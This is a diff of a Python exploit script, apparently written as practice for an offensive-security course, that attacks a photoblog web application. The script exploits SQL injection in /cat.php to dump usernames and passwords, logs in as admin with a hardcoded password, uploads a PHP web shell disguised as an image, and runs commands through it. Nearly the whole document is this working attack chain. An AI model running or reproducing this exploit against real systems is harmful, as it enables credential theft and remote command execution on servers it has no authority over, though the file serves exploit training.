@@ -1,16 +1,16 @@
 import requests
 
-target="" #ip_victim
-path_file=""# path to shell file
+target="172.16.113.159"
+path_file="/home/nyanyi/awae/preparacion/sqli_to_shell/solucion/console.php3"
 command='uname -a'
 
-def trigger():
+def sqli():
     path_sqli="/cat.php"
     url = "http://" + target + path_sqli
     payload = {'id':"2 UNION SELECT NULL,concat_ws(' : ' ,id,login,password),NULL,NULL FROM photoblog.users"}
     r=requests.get(url, params=payload, verify=False)
     print(r.text)
-    login()
+
 
 def login():
     path="/admin/index.php"
@@ -18,8 +18,8 @@ def login():
     payload={'user':'admin', 'password':'P4ssw0rd'}
     r=requests.post(url, data=payload, verify=False)
     print(r.status_code)
-    idcookies=(r.cookies['PHPSESSID'])
-    file_upload(idcookies)
+    return(r.cookies['PHPSESSID'])
+
 
 def file_upload(idcookies):
     path="/admin/index.php"
@@ -28,7 +28,6 @@ def file_upload(idcookies):
     files={'image':('lovecraft.php3',open(path_file,'rb'),'application/x-php')}
     cookies=dict(PHPSESSID=idcookies)
     requests.post(url, files=files, data=payload, cookies=cookies, verify=False)
-    remote_console()
 
 def remote_console():
     path="/admin/uploads/lovecraft"
@@ -40,4 +39,7 @@ def remote_console():
 	
 #start
 
-trigger()
+if __name__=='__main__':
+    sqli()
+    file_upload(login())
+    remote_console()
